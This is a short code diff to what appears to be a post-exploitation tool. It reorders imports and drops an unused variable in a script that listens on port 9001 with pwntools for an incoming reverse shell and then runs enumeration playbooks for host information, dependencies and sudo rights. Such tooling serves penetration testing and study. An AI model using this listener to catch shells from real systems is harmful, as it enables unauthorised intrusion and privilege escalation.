@@ -1,8 +1,8 @@
 import pwn
 import pheelshell
-import playbooks.enumerate.sudo_list
 import playbooks.enumerate.basic_host_information
 import playbooks.enumerate.dependencies
+import playbooks.enumerate.sudo_list
 import utilities
 
 LISTENING_PORT = 9001
@@ -22,7 +22,6 @@ def main():
         playbooks.enumerate.sudo_list.EnumerateSudoList()
     ]
 
-    commands_output = {}
     print(f'Listening {attacker_ip}:{LISTENING_PORT}...')
     with pwn.listen(LISTENING_PORT).wait_for_connection() as client:
         shell = pheelshell.PheelShell(client, b'$ ', attacker_ip)
